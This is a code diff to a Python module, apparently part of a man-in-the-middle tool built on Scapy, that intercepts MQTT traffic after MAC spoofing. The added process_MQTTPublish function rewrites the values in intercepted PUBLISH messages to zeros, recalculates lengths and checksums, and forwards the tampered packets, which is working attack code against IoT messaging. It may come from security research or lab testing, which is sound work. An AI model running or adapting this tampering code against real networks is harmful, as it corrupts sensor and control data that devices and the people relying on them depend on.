@@ -1,9 +1,15 @@
 from scapy.all import Packet, sendp
-from scapy.contrib.mqtt import MQTT, MQTTConnect
+from scapy.contrib.mqtt import MQTT, MQTTConnect, MQTTPublish
 from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP, TCP
 from .. import context
 from ..config import MQTT_PORT
+from ..processor.packet import get_layers, reassemble_packet, recalculate_values
+from ..processor.tampering import (
+    alter_MQTTPublish_packet,
+    value_to_zero,
+    value_to_zeros
+)
 
 
 def process_MQTTConnect(packet: MQTT) -> None:
@@ -29,15 +35,36 @@ def process_MQTTConnect(packet: MQTT) -> None:
     return None
 
 
+def process_MQTTPublish(packet: MQTT) -> None:
+
+    # Get MQTT message layers
+    layers: list[Packet] = get_layers(packet[MQTT])
+
+    # print(f"Layers ({len(layers)}): {layers}")
+
+    for layer in layers:
+        if type(layer) == MQTTPublish:
+            alter_MQTTPublish_packet(layer, value_to_zeros)
+
+    # Reassemble MQTT message layers
+    packet[MQTT] = reassemble_packet(layers)
+
+    # Recalculate lengths and checksums
+    del packet[MQTT].len
+    recalculate_values(packet)
+
+    return None
+
+
 def packet_callback(packet: Packet) -> None:
 
     # Don't process not TCP packets
     if not packet.haslayer(TCP):
-        return
+        return None
 
     # Don't process packets sent by the own host
     if packet[Ether].src == context['OWN_MAC_ADDRESS']:
-        return
+        return None
 
     # Only process MQTT or MQTT-related TCP packets
     if packet[TCP].sport == MQTT_PORT or packet[TCP].dport == MQTT_PORT:
@@ -48,15 +75,20 @@ def packet_callback(packet: Packet) -> None:
         msg += f"{packet[Ether].dst}/{packet[IP].dst}/{packet[TCP].dport}\n"
         print(msg)
     else:
-        return
+        return None
 
     # Revert MAC spoofing
     packet[Ether].src = context['OWN_MAC_ADDRESS']
     packet[Ether].dst = context['ARP_TABLE'].get(packet[IP].dst)
 
     if packet.haslayer(MQTTConnect):
-        packet.show()
+        # packet.show()
         process_MQTTConnect(packet)
+    elif packet.haslayer(MQTTPublish):
+        # packet.show()
+        process_MQTTPublish(packet)
+
+    # packet.show2()
 
     sendp(packet)
-    return
+    return None
